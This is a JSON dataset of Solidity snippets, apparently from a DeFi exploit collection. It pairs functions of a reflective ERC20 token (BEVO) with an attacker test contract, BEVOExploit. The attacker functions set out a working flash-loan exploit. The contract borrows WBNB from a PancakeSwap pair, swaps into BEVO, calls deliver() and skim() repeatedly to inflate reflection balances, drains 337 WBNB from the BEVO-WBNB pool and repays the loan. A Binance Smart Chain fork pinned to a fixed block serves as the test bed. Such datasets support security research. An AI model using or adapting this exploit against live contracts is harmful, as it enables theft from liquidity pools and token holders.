[
  {
    "contract/interface": "reflectiveERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "reflectiveERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "reflectiveERC20",
    "source_type": "victim_contract",
    "function_name": "deliver",
    "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
    "description": ""
  },
  {
    "contract/interface": "reflectiveERC20",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "reflectiveERC20",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) external {\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(bevo);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n\n        bevo.deliver(bevo.balanceOf(address(this)));\n        bevo_wbnb.skim(address(this));\n        bevo.deliver(bevo.balanceOf(address(this)));\n        bevo_wbnb.swap(337 ether, 0, address(this), \"\");\n\n        wbnb.transfer(address(wbnb_usdc), 193 ether);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25_230_702);\n\n        cheats.label(address(wbnb), \"WBNB\");\n        cheats.label(address(bevo), \"BEVO\");\n        cheats.label(address(wbnb_usdc), \"PancakePair: WBNB-USDC\");\n        cheats.label(address(bevo_wbnb), \"PancakePair: BEVO-WBNB\");\n        cheats.label(address(router), \"PancakeRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BEVOExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        // flashloan WBNB from PancakePair\n        wbnb.approve(address(router), type(uint256).max);\n        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"WBNB balance after exploit\", wbnb.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]